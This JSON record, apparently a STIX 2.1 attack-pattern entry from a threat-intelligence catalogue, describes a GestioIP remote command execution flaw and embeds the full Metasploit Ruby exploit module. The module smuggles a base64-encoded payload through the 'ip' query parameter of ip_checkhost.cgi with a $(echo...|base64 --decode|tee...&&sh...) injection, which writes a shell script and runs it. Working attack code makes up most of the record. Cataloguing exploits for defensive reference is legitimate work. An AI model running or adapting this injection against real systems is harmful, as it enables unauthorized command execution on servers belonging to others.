{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0c1a1a2-d744-4e81-b97d-0c725aeca3be",
    "created": "2024-08-14T17:11:00.755072Z",
    "modified": "2024-08-14T17:11:00.755076Z",
    "name": "GestioIP Remote Command Execution",
    "description": " This module exploits a command injection flaw to create a shell script on the filesystem and execute it. If GestioIP is configured to use no authentication no password is required to exploit the vulnerability. Otherwise, an authenticated user is required to exploit.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gestioip_exec.rb",
            "external_id": "gestioip_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/03/gestioip-authenticated-remote-command-execution-module"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GestioIP Remote Command Execution',\n      'Description'    => %q{\n        This module exploits a command injection flaw to create a shell script\n        on the filesystem and execute it. If GestioIP is configured to use no authentication,\n        no password is required to exploit the vulnerability. Otherwise, an authenticated\n        user is required to exploit.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bperry'  #Initial Discovery and metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://sourceforge.net/p/gestioip/gestioip/ci/ac67be9fce5ee4c0438d27dfa5c1dcbca08c457c/' ], # Patch\n          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2461' ], # First disclosure\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/10/03/gestioip-authenticated-remote-command-execution-module' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 475, # not a lot of room\n          'DisableNops' => true,\n          'BadChars'    => \"\",\n        },\n      'Platform'        => [ 'unix' ],\n      'Arch'            => ARCH_CMD,\n      'Targets'         => [[ 'Automatic GestioIP 3.0', { }]],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2013-10-04',\n      'DefaultTarget'   => 0))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [true, 'URI', '/gestioip/']),\n      OptString.new('HttpUsername', [false, 'The username to auth as', 'gipadmin']),\n      OptString.new('HttpPassword', [false, 'The password to auth with', nil])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def user\n    datastore['HttpUsername']\n  end\n\n  def pass\n    datastore['HttpPassword']\n  end\n\n  def use_auth\n    !(pass.nil? or pass.empty?)\n  end\n\n  def exploit\n\n    pay = Rex::Text.encode_base64(payload.encoded)\n    file = Rex::Text.rand_text_alpha(8)\n\n    options = {\n      'uri' => normalize_uri(target_uri.path, \"ip_checkhost.cgi\"),\n      'encode_params' => false,\n      'vars_get' => {\n          'ip' => \"2607:f0d0:$(echo${IFS}\" + pay + \"|base64${IFS}--decode|tee${IFS}\"+file+\"&&sh${IFS}\"+file+\"):0000:0000:0000:0000:0004\",\n          'hostname' => \"fds\",\n          'client_id' => \"1\",\n          'ip_version' => \"\"\n      }\n    }\n\n    if use_auth\n      options.merge!('authorization' => basic_auth(user,pass))\n    end\n\n    res = send_request_cgi(options)\n\n    if res and res.code == 401\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Please provide USERNAME and PASSOWRD\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-04",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}